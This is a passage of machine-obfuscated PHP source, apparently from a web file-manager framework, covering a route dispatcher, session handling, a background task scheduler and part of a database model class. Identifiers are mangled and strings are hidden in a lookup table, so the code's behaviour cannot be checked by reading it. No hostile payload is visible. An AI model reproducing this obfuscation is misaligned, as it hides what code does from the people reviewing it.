CacheLock::fileUnLock($«çÁ˜Â[23]); return $¢¥ï¥ÍÌ; } public function execute($Ûƒ™Â¸°) { $’¤¨×ùĞ =& $_SERVER[ªÏ§Ë·]; if (!CacheLock::fileLock($’¤¨×ùĞ[23])) { return !1; } $ØÑÔŞŠŸ = parent::execute($Ûƒ™Â¸°); CacheLock::fileUnLock($’¤¨×ùĞ[23]); return $ØÑÔŞŠŸ; } } class DbSqlite3 extends DbSqlite3Base { public function query($ÀíôÎŒ‚) { $şì“¯…Í =& $_SERVER[ªÏ§Ë·]; if (!CacheLock::fileLock($şì“¯…Í[23])) { return !1; } $‰…’¢›÷ = parent::query($ÀíôÎŒ‚); CacheLock::fileUnLock($şì“¯…Í[23]); return $‰…’¢›÷; } public function execute($Àè¸­˜“) { $ÑØ‘…ò =& $_SERVER[ªÏ§Ë·]; if (!CacheLock::fileLock($ÑØ‘…ò[23])) { return !1; } $µÁÓÊ·— = parent::execute($Àè¸­˜“); CacheLock::fileUnLock($ÑØ‘…ò[23]); return $µÁÓÊ·—; } } goto D×ÍÈˆÅ ¤; Añ§ó›‡ÒÎ: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\x2f\x5d\x2b", "\x3a\156\x75\x6d" => "\x5b\60\x2d\71\x5d\53", "\x3a\x61\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($ïƒ€€–, $¦·®§—æ) { $Ôê°ËŠ =& $_SERVER[ªÏ§Ë·]; if ($ïƒ€€– == $Ôê°ËŠ[1612]) { $ûÊ¤¼ªõ = array_map($Ôê°ËŠ[1613], $¦·®§—æ[0]); $†ß´ŠÅË = strpos($¦·®§—æ[1], $Ôê°ËŠ[8]) === 0 ? $¦·®§—æ[1] : $Ôê°ËŠ[8] . $¦·®§—æ[1]; $ô¬Û‡€ä = $¦·®§—æ[2]; } else { $ûÊ¤¼ªõ = null; $†ß´ŠÅË = strpos($¦·®§—æ[0], $Ôê°ËŠ[8]) === 0 ? $¦·®§—æ[0] : $Ôê°ËŠ[8] . $¦·®§—æ[0]; $ô¬Û‡€ä = $¦·®§—æ[1]; } array_push(self::$maps, $ûÊ¤¼ªõ); array_push(self::$routes, $†ß´ŠÅË); array_push(self::$methods, strtoupper($ïƒ€€–)); array_push(self::$callbacks, $ô¬Û‡€ä); } public static function error($ê©ÙïÔË) { self::$errorCallback = $ê©ÙïÔË; } public static function haltOnMatch($ĞÒã•Õ” = true) { self::$halts = $ĞÒã•Õ”; } public static function dispatch() { $şíıƒ‘‡ =& $_SERVER[ªÏ§Ë·]; $®âùú– = parse_url($_SERVER[$şíıƒ‘‡[1614]], PHP_URL_PATH); $”ÇÌöÔ¾ = $_SERVER[$şíıƒ‘‡[169]]; $ı•‘íõ = array_keys(static::$patterns); $®õ‡¼ºÜ = array_values(static::$patterns); $‹Ğ¤Åì = !1; self::$routes = preg_replace($şíıƒ‘‡[1301], $şíıƒ‘‡[8], self::$routes); if (in_array($®âùú–, self::$routes)) { $İâ¢æ Ø = array_keys(self::$routes, $®âùú–); foreach ($İâ¢æ Ø as $ŞÕŠ¢‰) { if (self::$methods[$ŞÕŠ¢‰] == $”ÇÌöÔ¾ || self::$methods[$ŞÕŠ¢‰] == $şíıƒ‘‡[1615] || in_array($”ÇÌöÔ¾, self::$maps[$ŞÕŠ¢‰])) { $‹Ğ¤Åì = !0; if (!is_object(self::$callbacks[$ŞÕŠ¢‰])) { $‡°´Š¹À = explode($şíıƒ‘‡[8], self::$callbacks[$ŞÕŠ¢‰]); $í®ÉîŞ = end($‡°´Š¹À); $êµÑ•«† = explode($şíıƒ‘‡[1233], $í®ÉîŞ); $‘şãä = new $êµÑ•«†[0](); $‘şãä->{$êµÑ•«†[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$ŞÕŠ¢‰]); if (self::$halts) { return; } } } } } else { $Šı‘‡ç = 0; foreach (self::$routes as $ŞÕŠ¢‰) { if (strpos($ŞÕŠ¢‰, $şíıƒ‘‡[4]) !== !1) { $ŞÕŠ¢‰ = str_replace($ı•‘íõ, $®õ‡¼ºÜ, $ŞÕŠ¢‰); } if (preg_match($şíıƒ‘‡[1616] . $ŞÕŠ¢‰ . $şíıƒ‘‡[1617], $®âùú–, $¹Ä‡½øÇ)) { if (self::$methods[$Šı‘‡ç] == $”ÇÌöÔ¾ || self::$methods[$Šı‘‡ç] == $şíıƒ‘‡[1615] || !empty(self::$maps[$Šı‘‡ç]) && in_array($”ÇÌöÔ¾, self::$maps[$Šı‘‡ç])) { $‹Ğ¤Åì = !0; array_shift($¹Ä‡½øÇ); if (!is_object(self::$callbacks[$Šı‘‡ç])) { $‡°´Š¹À = explode($şíıƒ‘‡[8], self::$callbacks[$Šı‘‡ç]); $í®ÉîŞ = end($‡°´Š¹À); $êµÑ•«† = explode($şíıƒ‘‡[1233], $í®ÉîŞ); $‘şãä = new $êµÑ•«†[0](); if (!method_exists($‘şãä, $êµÑ•«†[1])) { echo $şíıƒ‘‡[1618]; } else { call_user_func_array(array($‘şãä, $êµÑ•«†[1]), $¹Ä‡½øÇ); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$Šı‘‡ç], $¹Ä‡½øÇ); if (self::$halts) { return; } } } } $Šı‘‡ç++; } } if ($‹Ğ¤Åì == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $ËŸóú˜‹ =& $_SERVER[ªÏ§Ë·]; header($_SERVER[$ËŸóú˜‹[1619]] . $ËŸóú˜‹[1620]); echo $ËŸóú˜‹[1621]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$şíıƒ‘‡[1614]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $Ò·Ô¾Š« =& $_SERVER[ªÏ§Ë·]; static $ù¯¤€í­ = false; if ($ù¯¤€í­) { return $ù¯¤€í­; } $ìÖ„Á® = $GLOBALS[$Ò·Ô¾Š«[6]][$Ò·Ô¾Š«[387]]; self::$sessionTime = $ìÖ„Á®[$Ò·Ô¾Š«[1622]]; $•¼‰  À = isset($GLOBALS[$Ò·Ô¾Š«[1623]]) ? $GLOBALS[$Ò·Ô¾Š«[1623]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($•¼‰  À)) { self::$sessionSign = Cookie::get($•¼‰  À); } else { self::$sessionSign = guid(); } } Cookie::setSafe($•¼‰  À, self::$sessionSign, self::$sessionTime); $Ëõ„õ‡ = $ìÖ„Á®[$Ò·Ô¾Š«[1624]]; $È¨ö¨Ú– = $ìÖ„Á®[$Ëõ„õ‡]; $Ö•Œ³¦ = $ìÖ„Á®[$Ò·Ô¾Š«[856]]; switch ($Ëõ„õ‡) { case $Ò·Ô¾Š«[31]: self::$handle = Model($Ò·Ô¾Š«[857]); break; case $Ò·Ô¾Š«[858]: self::$handle = new CacheRedis($È¨ö¨Ú–, $Ö•Œ³¦); break; case $Ò·Ô¾Š«[859]: self::$handle = new CacheMemcached($È¨ö¨Ú–, $Ö•Œ³¦); break; case $Ò·Ô¾Š«[210]: $È¨ö¨Ú–[$Ò·Ô¾Š«[94]] = $È¨ö¨Ú–[$Ò·Ô¾Š«[94]] . $Ò·Ô¾Š«[1625]; self::$handle = new CacheFile($È¨ö¨Ú–, $Ö•Œ³¦); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ù¯¤€í­ = new self(); return $ù¯¤€í­; } public static function getBySign($Û†íÌı”) { $ù¯á€¢÷ = self::$handle->get($Û†íÌı”); $ù¯á€¢÷ = unserialize($ù¯á€¢÷); return is_array($ù¯á€¢÷) ? $ù¯á€¢÷ : array(); } public static function setBySign($ÖäâÇã¹, $ñÇºœ‘ƒ) { CacheLock::lock($ÖäâÇã¹); self::$handle->set($ÖäâÇã¹, serialize($ñÇºœ‘ƒ), self::$sessionTime); CacheLock::unlock($ÖäâÇã¹); } public static function sign($Û¨Áª†² = false) { $Û¨Áª†² && (self::$sessionSign = $Û¨Áª†²); self::init(); return self::$sessionSign; } public static function set($í½î‚ì», $Å³Ìá©¼ = false) { self::init(); if (is_array($í½î‚ì»)) { foreach ($í½î‚ì» as $¬©Ø·ë => $ÜÆ«ĞÊà) { array_set_value(self::$data, $¬©Ø·ë, $ÜÆ«ĞÊà); } } else { array_set_value(self::$data, $í½î‚ì», $Å³Ìá©¼); } self::setBySign(self::$sessionSign, self::$data); } public static function get($²›óÆŸ× = false) { self::init(); if (!$²›óÆŸ×) { return self::$data; } return array_get_value(self::$data, $²›óÆŸ×); } public static function remove($­¥…šåÜ) { self::init(); unset(self::$data[$­¥…šåÜ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ªÏ§Ë·][861])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $ˆùÉæ’Ğ =& $_SERVER[ªÏ§Ë·]; if (self::valueGet($ˆùÉæ’Ğ[778]) != $ˆùÉæ’Ğ[98]) { return; } if (self::valueGet($ˆùÉæ’Ğ[1626]) == $ˆùÉæ’Ğ[98]) { $¦ Š•ÁÆ = self::valueGet($ˆùÉæ’Ğ[1627]); if (time() - $¦ Š•ÁÆ > self::AUTO_RESTART_TIME) { self::restart(); } return; } http_close(); $GLOBALS[$ˆùÉæ’Ğ[1628]] = 1; self::valueSet($ˆùÉæ’Ğ[1626], $ˆùÉæ’Ğ[98]); self::log($ˆùÉæ’Ğ[1629] . ACTION . $ˆùÉæ’Ğ[1630]); Session::$data = array(); Session::$sessionSign = $ˆùÉæ’Ğ[12]; $GLOBALS[$ˆùÉæ’Ğ[532]] = 1; Hook::bind($ˆùÉæ’Ğ[1631], $ˆùÉæ’Ğ[1632]); $Ş¶ ¨æ = 0; while (!0) { self::cacheClear(); if (self::valueGet($ˆùÉæ’Ğ[778]) != $ˆùÉæ’Ğ[98]) { self::valueSet($ˆùÉæ’Ğ[1626], $ˆùÉæ’Ğ[208]); self::log($ˆùÉæ’Ğ[1633]); die; } $“ùãàû  = time(); if ($“ùãàû  - $Ş¶ ¨æ >= 60) { self::valueSet(array($ˆùÉæ’Ğ[1626] => $ˆùÉæ’Ğ[98], $ˆùÉæ’Ğ[1627] => $“ùãàû ), !1); $Ş¶ ¨æ = $“ùãàû ; } if (!file_exists(USER_SYSTEM . $ˆùÉæ’Ğ[1634])) { self::valueSet(array($ˆùÉæ’Ğ[1626] => $ˆùÉæ’Ğ[208], $ˆùÉæ’Ğ[778] => $ˆùÉæ’Ğ[208]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function restart() { $Ü¨÷Ñ‹¼ =& $_SERVER[ªÏ§Ë·]; http_close(); self::valueSet($Ü¨÷Ñ‹¼[778], $Ü¨÷Ñ‹¼[208]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($Ü¨÷Ñ‹¼[1626] => $Ü¨÷Ñ‹¼[208], $Ü¨÷Ñ‹¼[778] => $Ü¨÷Ñ‹¼[98]), !1); } public static function taskSwitch() { $¶çŸªì =& $_SERVER[ªÏ§Ë·]; $¿ïÛ¸…¦ = self::valueGet($¶çŸªì[778]) == $¶çŸªì[98] ? $¶çŸªì[208] : $¶çŸªì[98]; self::valueSet($¶çŸªì[778], $¿ïÛ¸…¦); } public static function shutdownEvent() { $Î³¹şÑ´ =& $_SERVER[ªÏ§Ë·]; self::valueSet($Î³¹şÑ´[1626], $Î³¹şÑ´[208]); self::log($Î³¹şÑ´[1635]); } public static function config($›»¬í•á, $¦å­…Ñş) { self::valueSet($_SERVER[ªÏ§Ë·][778], $›»¬í•á); } private static function taskRunAll() { $­ğë³úÈ =& $_SERVER[ªÏ§Ë·]; $‘ùÕ‘°Ã = timeFloat(); $üèõ‚â = Model($­ğë³úÈ[1636])->listData(); $å»èªœ = count($üèõ‚â); for ($Ë£ÉŠÏ¯ = 0; $Ë£ÉŠÏ¯ < $å»èªœ; $Ë£ÉŠÏ¯++) { $Ï€‹¬öÆ = $üèõ‚â[$Ë£ÉŠÏ¯]; if (!$Ï€‹¬öÆ[$­ğë³úÈ[437]] || $Ï€‹¬öÆ[$­ğë³úÈ[1637]] != $­ğë³úÈ[98]) { continue; } if (!self::taskTimeCheck($Ï€‹¬öÆ)) { continue; } self::taskRun($Ï€‹¬öÆ); } Hook::trigger($­ğë³úÈ[1638]); self::taskQueueRun($‘ùÕ‘°Ã); } private static function taskQueueRun($àå±£Å¶) { $Ñã»ãà  = 10; while (!0) { $‚ï³–ßØ = TaskQueue::run(); if ($‚ï³–ßØ === !1) { break; } if (timeFloat() - $àå±£Å¶ >= $Ñã»ãà ) { break; } } } private static function taskTimeCheck($¡€µî·Ò) { $ıšãÅÏŞ =& $_SERVER[ªÏ§Ë·]; $ø¤¡ŸÚä = json_decode($¡€µî·Ò[$ıšãÅÏŞ[190]], !0); $é³Ç¬ô¿ = intval($¡€µî·Ò[$ıšãÅÏŞ[1627]]); $ŞŠÔ›õ = strtotime($ıšãÅÏŞ[1639] . $ø¤¡ŸÚä[$ıšãÅÏŞ[1640]] . $ıšãÅÏŞ[1641]) - strtotime($ıšãÅÏŞ[1642]); $Ú›êûñ = time() - strtotime(date($ıšãÅÏŞ[1643]) . $ıšãÅÏŞ[1644]); $£ö«‚Ÿ´ = $Ú›êûñ >= $ŞŠÔ›õ && $Ú›êûñ <= $ŞŠÔ›õ + 3600; switch ($ø¤¡ŸÚä[$ıšãÅÏŞ[43]]) { case $ıšãÅÏŞ[1645]: if (time() - $é³Ç¬ô¿ < 3600 * 24 * 30) { return !1; } if ($ø¤¡ŸÚä[$ıšãÅÏŞ[1645]] == date($ıšãÅÏŞ[1646]) && $£ö«‚Ÿ´) { return !0; } break; case $ıšãÅÏŞ[1647]: if (time() - $é³Ç¬ô¿ < 3600 * 24 * 7) { return !1; } $öÈ–Øµñ = date($ıšãÅÏŞ[1648]) == 0 ? 7 : date($ıšãÅÏŞ[1648]); if ($ø¤¡ŸÚä[$ıšãÅÏŞ[1647]] == $öÈ–Øµñ && $£ö«‚Ÿ´) { return !0; } break; case $ıšãÅÏŞ[1640]: if (time() - $é³Ç¬ô¿ < 3600 * 24) { return !1; } if ($£ö«‚Ÿ´) { return !0; } break; case $ıšãÅÏŞ[1649]: if (time() - $é³Ç¬ô¿ >= floatval($ø¤¡ŸÚä[$ıšãÅÏŞ[1649]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $å¾»íÑœ =& $_SERVER[ªÏ§Ë·]; static $ïÅÊºŒÑ = 0; $ÃéŸéìÇ = 300; if (!$ïÅÊºŒÑ) { $ïÅÊºŒÑ = time(); } if (time() - $ïÅÊºŒÑ < $ÃéŸéìÇ) { return; } $ïÅÊºŒÑ = time(); $üûùªŠ‹ = Model($å¾»íÑœ[542])->db($å¾»íÑœ[12]); if ($üûùªŠ‹) { $üûùªŠ‹->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($å¾»íÑœ[1650], $å¾»íÑœ[1651]); die; } } public static function taskRun($·÷ÍìĞù) { $İ±éÂí =& $_SERVER[ªÏ§Ë·]; self::log($İ±éÂí[1652] . $·÷ÍìĞù[$İ±éÂí[437]] . $İ±éÂí[1653] . $·÷ÍìĞù[$İ±éÂí[42]] . $İ±éÂí[1654] . $·÷ÍìĞù[$İ±éÂí[1655]]); Model($İ±éÂí[1636])->run($·÷ÍìĞù[$İ±éÂí[437]]); $­¹¬¬ß = timeFloat(); $”úƒ†É¤ = $İ±éÂí[12]; switch ($·÷ÍìĞù[$İ±éÂí[43]]) { case $İ±éÂí[345]: $õŒªşš¹ = url_request($·÷ÍìĞù[$İ±éÂí[1655]], $İ±éÂí[240], !1, !1, !1, !1, 10); if ($õŒªşš¹[$İ±éÂí[778]]) { $”úƒ†É¤ = strlen($õŒªşš¹[$İ±éÂí[1227]]); } break; case $İ±éÂí[239]: $”úƒ†É¤ = Hook::apply($·÷ÍìĞù[$İ±éÂí[1655]]); default: break; } Model($İ±éÂí[1656])->add(array($İ±éÂí[1657] => $İ±éÂí[12], $İ±éÂí[1658] => $İ±éÂí[208], $İ±éÂí[43] => $İ±éÂí[1659] . $·÷ÍìĞù[$İ±éÂí[437]], $İ±éÂí[1660] => json_encode(array($İ±éÂí[42] => $·÷ÍìĞù[$İ±éÂí[42]], $İ±éÂí[1661] => timeFloat() - $­¹¬¬ß, $İ±éÂí[331] => $”úƒ†É¤)))); $“Ë°ãÉè = $”úƒ†É¤ ? $İ±éÂí[1662] . $”úƒ†É¤ : $İ±éÂí[12]; self::log($İ±éÂí[1663] . $·÷ÍìĞù[$İ±éÂí[437]] . $İ±éÂí[174] . $“Ë°ãÉè); return !0; } private static function valueGet($®¦•¼ô¦) { $Œ†ò÷‘ =& $_SERVER[ªÏ§Ë·]; $¥¹ï‰Õš = $Œ†ò÷‘[1664]; $èëô¡´Ò = Model($Œ†ò÷‘[473])->get($®¦•¼ô¦, $¥¹ï‰Õš); if (is_null($èëô¡´Ò)) { Model($Œ†ò÷‘[473])->set($Œ†ò÷‘[778], $Œ†ò÷‘[98], $¥¹ï‰Õš); Model($Œ†ò÷‘[473])->set($Œ†ò÷‘[1626], $Œ†ò÷‘[208], $¥¹ï‰Õš); $èëô¡´Ò = Model($Œ†ò÷‘[473])->get($®¦•¼ô¦, $¥¹ï‰Õš); } return $èëô¡´Ò; } private static function valueSet($æİÆ‡¸í, $±¥Ù¿Š×) { $ÓÆÀ÷³Ö =& $_SERVER[ªÏ§Ë·]; $ÛÜ±…  = $ÓÆÀ÷³Ö[1665]; CacheLock::lock($ÛÜ±… ); $ÑÑÖ î = Model($ÓÆÀ÷³Ö[473])->set($æİÆ‡¸í, $±¥Ù¿Š×, $ÓÆÀ÷³Ö[1664]); CacheLock::unlock($ÛÜ±… ); return $ÑÑÖ î; } protected static function log($ä§î®è) { write_log($ä§î®è, $_SERVER[ªÏ§Ë·][1651]); } private static function cacheClear() { $Ã ÇÛªº =& $_SERVER[ªÏ§Ë·]; Cache::clearMemory(Model($Ã ÇÛªº[473])->cacheKey($Ã ÇÛªº[1664])); Cache::clearMemory(Model($Ã ÇÛªº[473])->cacheKey($Ã ÇÛªº[1666])); Model($Ã ÇÛªº[1636])->cacheClear(); self::closeDatabase(); } } goto d…†Ìù¡“´; däå¤œ¸: class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\154\145", "\x6f\x72\144\x65\x72", "\141\x6c\x69\x61\163", "\150\x61\166\151\156\x67", "\x67\x72\157\165\x70", "\154\157\x63\x6b", "\144\151\x73\164\151\x6e\x63\164", "\141\x75\164\157", "\146\151\154\164\145\162", "\x76\141\x6c\x69\144\x61\x74\145", "\x72\145\x73\165\x6c\x74", "\x62\x69\x6e\x64", "\164\157\x6b\x65\x6e"); public function __construct($¡Áä®ëş = '', $²À®Ş = '', $ûÉ¹Ì¸Î = '') { $ûÂƒÖ¥ã =& $_SERVER[ªÏ§Ë·]; $this->_initialize(); if (!empty($¡Áä®ëş)) { if (strpos($¡Áä®ëş, $ûÂƒÖ¥ã[10])) { list($this->dbName, $this->name) = explode($ûÂƒÖ¥ã[10], $¡Áä®ëş); } else { $this->name = $¡Áä®ëş; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($²À®Ş)) { $this->tablePrefix = $ûÂƒÖ¥ã[12]; } elseif ($ûÂƒÖ¥ã[12] != $²À®Ş) { $this->tablePrefix = $²À®Ş; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($ûÂƒÖ¥ã[282]); } $this->db(0, empty($this->connection) ? $ûÉ¹Ì¸Î : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $õ˜¦ˆú• =& $_SERVER[ªÏ§Ë·]; if (empty($this->fields)) { if (think_config($õ˜¦ˆú•[283])) { $§²œÅµ = $this->dbName ? $this->dbName : think_config($õ˜¦ˆú•[284]); $€³¢äçé = think_var_cache($õ˜¦ˆú•[285] . strtolower(get_path_this($§²œÅµ) . $õ˜¦ˆú•[10] . $this->name)); if ($€³¢äçé) { $÷˜òãí = think_config($õ˜¦ˆú•[286]); if (empty($÷˜òãí) || $€³¢äçé[$õ˜¦ˆú•[287]] == $÷˜òãí) { $this->fields = $€³¢äçé; return; } } } $this->flush(); } } public function flush() { $ˆæ¾ èÉ =& $_SERVER[ªÏ§Ë·]; $this->db->setModel($this->name); $ûÔµŒÑá = $this->db->getFields($this->getTableName()); if (!$ûÔµŒÑá) { return !1; } $this->fields = array_keys($ûÔµŒÑá); $this->fields[$ˆæ¾ èÉ[288]] = !1; foreach ($ûÔµŒÑá as $‰Èä»Ãğ => $öèçäÌÑ) { $‘Á›äŸÂ[$‰Èä»Ãğ] = $öèçäÌÑ[$ˆæ¾ èÉ[43]]; if ($öèçäÌÑ[$ˆæ¾ èÉ[49]]) { $this->fields[$ˆæ¾ èÉ[289]] = $‰Èä»Ãğ; if ($öèçäÌÑ[$ˆæ¾ èÉ[52]]) { $this->fields[$ˆæ¾ èÉ[288]] = !0; } } } $this->fields[$ˆæ¾ èÉ[290]] = $‘Á›äŸÂ; if (think_config($ˆæ¾ èÉ[286])) { $this->fields[$ˆæ¾ èÉ[287]] = think_config($ˆæ¾ èÉ[286]); } if (think_config($ˆæ¾ èÉ[283])) { $–¤¨İŸ = $this->dbName ? $this->dbName : think_config($ˆæ¾ èÉ[284]); think_var_cache($ˆæ¾ èÉ[285] . strtolower(get_path_this($–¤¨İŸ) . $ˆæ¾ èÉ[10] . $this->name), $this->fields); } } public function switchModel($ËöïŸº, $ñäì°ŞŠ = array()) { $òĞ¡¿ =& $_SERVER[ªÏ§Ë·]; $¨ëÒÕº = ucwords(strtolower($ËöïŸº)) . $òĞ¡¿[291]; if (!class_exists($¨ëÒÕº)) { think_exception($¨ëÒÕº . think_lang($òĞ¡¿[292])); } $this->_extModel = new $¨ëÒÕº($this->name); if (!empty($ñäì°ŞŠ)) { foreach ($ñäì°ŞŠ as $Ööí¨¸Ø) { $this->_extModel->setProperty($Ööí¨¸Ø, $this->{$Ööí¨¸Ø}); } } return $this->_extModel; } public function __set($œİËÈÕÏ, $°€ÆÕ Ë) { $this->data[$œİËÈÕÏ] = $°€ÆÕ Ë; } public function __get($÷éİ‹èë) { return isset($this->data[$÷éİ‹èë]) ? $this->data[$÷éİ‹èë] : null; } public function __isset($æğÛå±) { return isset($this->data[$æğÛå±]); } public function __unset($ËÓÄ“Ã) { unset($this->data[$ËÓÄ“Ã]); } public function __call($‘†ŸåùÊ, $²ˆÜÔ) { $ÖÄœ„ë =& $_SERVER[ªÏ§Ë·]; if (in_array(strtolower($‘†ŸåùÊ), $this->methods, !0)) { $this->options[strtolower($‘†ŸåùÊ)] = $²ˆÜÔ[0]; return $this; } elseif (in_array(strtolower($‘†ŸåùÊ), array($ÖÄœ„ë[293], $ÖÄœ„ë[294], $ÖÄœ„ë[295], $ÖÄœ„ë[296], $ÖÄœ„ë[297]), !0)) { $ŸåˆêšÅ = isset($²ˆÜÔ[0]) ? $²ˆÜÔ[0] : $ÖÄœ„ë[199]; $ŸåˆêšÅ = $this->db->parseKey($ŸåˆêšÅ); return $this->getField(strtoupper($‘†ŸåùÊ) . $ÖÄœ„ë[298] . $ŸåˆêšÅ . $ÖÄœ„ë[299] . $‘†ŸåùÊ, $ÖÄœ„ë[293]); } elseif (strtolower(substr($‘†ŸåùÊ, 0, 5)) == $ÖÄœ„ë[300]) { $ŸåˆêšÅ = think_parse_name(substr($‘†ŸåùÊ, 5)); $·÷ŞúŸí[$ŸåˆêšÅ] = $²ˆÜÔ[0]; return $this->where($·÷ŞúŸí)->find(); } elseif (strtolower(substr($‘†ŸåùÊ, 0, 10)) == $ÖÄœ„ë[301]) { $µéÏÂ·æ = think_parse_name(substr($‘†ŸåùÊ, 10)); $·÷ŞúŸí[$µéÏÂ·æ] = $²ˆÜÔ[0]; return $this->where($·÷ŞúŸí)->getField($²ˆÜÔ[1]); } elseif (isset($this->_scope[$‘†ŸåùÊ])) { return $this->scope($‘†ŸåùÊ, $²ˆÜÔ[0]); } elseif (method_exists($this, $‘†ŸåùÊ)) { array_unshift($²ˆÜÔ, $‘†ŸåùÊ); return call_user_func_array(array($this, $ÖÄœ„ë[302]), $²ˆÜÔ); } else { return call_user_func_array(array(parent, $‘†ŸåùÊ), $²ˆÜÔ); } } protected function call() { $³¡÷Ü®¾ =& $_SERVER[ªÏ§Ë·]; $¦Ö”íöô = func_get_args(); $Ùëªò¢ = array_shift($¦Ö”íöô); $ôêÖ•˜— = $Ùëªò¢; if (is_array($Ùëªò¢)) { $ôêÖ•˜— = $Ùëªò¢[1]; $Ùëªò¢ = $Ùëªò¢[0]; } $¿º¤ıÓ¾ = count($¦Ö”íöô) - 1; if (isset($¦Ö”íöô[$¿º¤ıÓ¾]) && $¦Ö”íöô[$¿º¤ıÓ¾] === $Ùëªò¢) { think_exception(__CLASS__ . $³¡÷Ü®¾[4] . $Ùëªò¢ . think_lang($³¡÷Ü®¾[303])); return; } $¦Ö”íöô[] = $Ùëªò¢; if (method_exists($this, $³¡÷Ü®¾[304])) { $œ¨ª›© = call_user_func_array(array($this, $³¡÷Ü®¾[305]), array($ôêÖ•˜—, $¦Ö”íöô)); if (!is_null($œ¨ª›©) && $œ¨ª›© !== !1) { return $œ¨ª›©; } } $Å«´Íş = call_user_func_array(array($this, $Ùëªò¢), $¦Ö”íöô); if (method_exists($this, $³¡÷Ü®¾[306])) { $œ¨ª›© = call_user_func_array(array($this, $³¡÷Ü®¾[307]), array($ôêÖ•˜—, $¦Ö”íöô, $Å«´Íş)); if ($œ¨ª›©) { return $œ¨ª›©; } } return $Å«´Íş; } protected function _initialize() { } protected function _facade($´©ÈäŒ) { $¤Õí­áÔ =& $_SERVER[ªÏ§Ë·]; if (!empty($this->fields)) { foreach ($´©ÈäŒ as $ÜîœüÉû => $¦û•û˜İ) { if (is_array($this->fields) && !in_array($ÜîœüÉû, $this->fields, !0)) { unset($´©ÈäŒ[$ÜîœüÉû]); } elseif (is_scalar($¦û•û˜İ)) { $this->_parseType($´©ÈäŒ, $ÜîœüÉû); } } } if (!empty($this->options[$¤Õí­áÔ[308]])) { $´©ÈäŒ = array_map($this->options[$¤Õí­áÔ[308]], $´©ÈäŒ); unset($this->options[$¤Õí­áÔ[308]]); } $this->_beforeWrite($´©ÈäŒ); return $´©ÈäŒ; } protected function _beforeWrite(&$Ë’Ïıšë) { } public function add($—·ëÍêà = '', $°Åå®Çû = array(), $ù­°ÒÛ³ = false) { if (empty($—·ëÍêà)) { if (!empty($this->data)) { $—·ëÍêà = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ªÏ§Ë·][309]); return !1; } } $°Åå®Çû = $this->_parseOptions($°Åå®Çû); $—·ëÍêà = $this->_facade($—·ëÍêà); if (!1 === $this->_beforeInsert($—·ëÍêà, $°Åå®Çû)) { return !1; } $ÓĞøãÖİ = $this->db->insert($—·ëÍêà, $°Åå®Çû, $ù­°ÒÛ³); if (!1 !== $ÓĞøãÖİ) { $¢ÄşÂ• = $this->getLastInsID(); if ($¢ÄşÂ•) { $—·ëÍêà[$this->getPk()] = $¢ÄşÂ•; $this->_after_insert($—·ëÍêà, $°Åå®Çû); return $¢ÄşÂ•; } $this->_after_insert($—·ëÍêà, $°Åå®Çû); } return $ÓĞøãÖİ; } protected function _beforeInsert(&$àÒÏ™„, $‹˜‡ìÌ•) { } protected function _after_insert($ï†„¢¯Ö, $¨ÆĞ¹˜À) { } public function addAll($šÒ¸…, $®ğ ÷ñ‘ = array(), $ÄÏ‰¥õÃ = false) { $ÚÛö¯ßã =& $_SERVER[ªÏ§Ë·]; if (empty($šÒ¸…)) { $this->error = think_lang($ÚÛö¯ßã[309]); return !1; } $®ğ ÷ñ‘ = $this->_parseOptions($®ğ ÷ñ‘); foreach ($šÒ¸… as $ò ¿§ˆß => $™¬Ìñğ¤) { $šÒ¸…[$ò ¿§ˆß] = $this->_facade($™¬Ìñğ¤); } if (method_exists($this->db, $ÚÛö¯ßã[310])) { $û¼ü‡ºÕ = $this->db->insertAll($šÒ¸…, $®ğ ÷ñ‘, $ÄÏ‰¥õÃ); } else { $this->startTrans(); foreach ($šÒ¸… as $ò ¿§ˆß => $™¬Ìñğ¤) { $û¼ü‡ºÕ = $this->db->insert($™¬Ìñğ¤, $®ğ ÷ñ‘, $ÄÏ‰¥õÃ); } $this->commit(); } if (!1 !== $û¼ü‡ºÕ) { $œ ìŠ¶½ = $this->getLastInsID(); if ($œ ìŠ¶½) { return $œ ìŠ¶½; } } return $û¼ü‡ºÕ; } public function selectAdd($ß¡Ìî®‡ = '', $„ˆ—ÂÓ = '', $„²„ë’« = array()) { $ÙÒÒˆüØ =& $_SERVER[ªÏ§Ë·]; $„²„ë’« = $this->_parseOptions($„²„ë’«); if (!1 === ($„¿óĞ† = $this->db->selectInsert($ß¡Ìî®‡ ? $ß¡Ìî®‡ : 